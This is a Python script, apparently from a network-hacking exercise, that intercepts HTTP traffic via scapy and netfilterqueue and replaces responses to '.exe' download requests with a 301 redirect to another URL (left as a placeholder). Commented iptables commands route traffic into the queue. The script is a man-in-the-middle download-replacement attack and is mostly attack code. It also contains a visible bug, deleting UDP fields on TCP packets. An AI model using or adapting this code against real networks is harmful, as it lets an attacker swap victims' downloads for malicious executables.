#!usr/bin/env python
import scapy.all as scapy
import netfilterqueue

ack_list = []


# def process_packet(packet):
#     scapy_packet = scapy.IP(packet.get_payload())
#     if scapy_packet.haslayer(scapy.Raw):
#         # print(scapy_packet.show())
#         if scapy_packet[scapy.TCP].dport == 80:
#             # print("[+] this is a HTTP Request")
#             if ".exe" in scapy_packet[scapy.Raw].load:
#                 print("[+] exe Request")
#                 ack_list.append(scapy_packet[scapy.TCP].ack)
#             # print(scapy_packet.show())
#         elif scapy_packet[scapy.TCP].sport == 80:
#             # print("[+] this is a http response")
#             if scapy_packet[scapy.TCP].seq in ack_list:
#                 ack_list.remove(scapy_packet[scapy.TCP].seq)
#                 # print(scapy_packet.show())
#                 print("[+] Replacing File")
#                 scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://....\n\n"
#                 del scapy_packet[scapy.IP].len
#                 del scapy_packet[scapy.IP].chksum
#                 del scapy_packet[scapy.UDP].len
#                 del scapy_packet[scapy.UDP].chksum
#                 packet.set_payload(str(scapy_packet))
#
#
#     packet.accept()

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.UDP].len
    del packet[scapy.UDP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing File")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://....\n\n")
                packet.set_payload(str(modified_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()










# subprocess.call(["sudo", "iptables", "-I", "FORWARD -j NFQUEUE --queue-num 0"])
# subprocess.call(["sudo", "iptables", "-I", "OUTPUT -j NFQUEUE --queue-num 0"])
# subprocess.call(["sudo", "iptables", "-I", "INPUT -j NFQUEUE --queue-num 0"])
